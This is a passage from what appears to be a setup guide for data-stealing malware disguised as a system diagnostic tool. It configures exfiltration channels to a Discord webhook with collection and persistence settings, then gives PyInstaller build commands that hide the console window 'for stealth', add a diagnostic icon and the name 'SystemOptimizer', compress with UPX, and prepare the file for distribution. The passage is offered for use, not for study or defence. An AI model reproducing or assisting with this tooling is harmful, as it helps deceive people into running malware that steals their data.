   ```python
   # ===== MULTI-CHANNEL EXFILTRATION CONFIG =====
   EXFILTRATION_CHANNELS = {
       "discord": {
           "webhook_url": "YOUR_WEBHOOK_URL_HERE",
           "enabled": True,
           "priority": 1
       },
       # ... other channels
   }
   ```

3. Replace `YOUR_WEBHOOK_URL_HERE` with your actual Discord webhook URL

4. Customize other settings as needed:
   - Enable/disable exfiltration channels
   - Adjust collection parameters
   - Modify persistence settings

## üîó Discord Webhook Setup

## üì¶ Packaging to Executable

### Using PyInstaller

1. **Install PyInstaller**
   ```bash
   pip install pyinstaller
   ```

2. **Create executable**
   ```bash
   pyinstaller --onefile --windowed --icon=diagnostic.ico system_checkup_helper.py
   ```

   Options explained:
   - `--onefile`: Package into a single executable
   - `--windowed`: Hide console window (for stealth)
   - `--icon`: Add a custom icon (optional)

3. **Find the executable**
   - The compiled file will be in the `dist` folder
   - Test the executable before distribution

### Advanced Packaging Options

For enhanced stealth, use these additional parameters:

```bash
pyinstaller --onefile --windowed --name "SystemOptimizer" --upx-dir=/path/to/upx --add-data "icon.ico;." system_checkup_helper.py
```

- `--name`: Set a friendly name for the executable
- `--upx-dir`: Compress with UPX (download from https://upx.github.io/)
- `--add-data`: Include additional files
